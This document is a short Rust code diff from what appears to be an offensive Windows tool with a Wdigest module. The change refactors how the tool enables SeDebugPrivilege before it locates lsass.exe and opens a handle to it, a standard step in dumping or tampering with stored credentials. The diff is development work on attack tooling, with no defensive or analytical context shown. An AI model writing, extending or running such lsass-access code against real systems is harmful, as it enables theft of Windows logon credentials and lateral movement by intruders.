@@ -1,4 +1,7 @@
-use crate::utilities::Utils;
+use crate::utilities::{
+    SE_DEBUG_NAME,
+    Utils,
+};
 
 use winapi::um::processthreadsapi::OpenProcess;
 
@@ -170,10 +173,8 @@ impl Wdigest {
             println!("[-] Program requires atleast administrative permissions");
             return Ok(());
         }
-        let (debug_boolean, debug_result) = Utils::enable_debug_privilege();
-        if debug_boolean {
-            println!("{}", debug_result);
 
+        if Utils::enable_privilege(SE_DEBUG_NAME.as_ptr()) {
             let lsass_pid = get_process_pid("lsass");
             if let Ok(handle) = get_process_handle(lsass_pid) {
                 println!("[+] Opened handle to lsass.exe");
@@ -214,7 +215,7 @@ impl Wdigest {
             }
 
         } else {
-            println!("{}", debug_result);
+            println!("[-] Unable to set the debug permission");
         }
 
         Ok(())
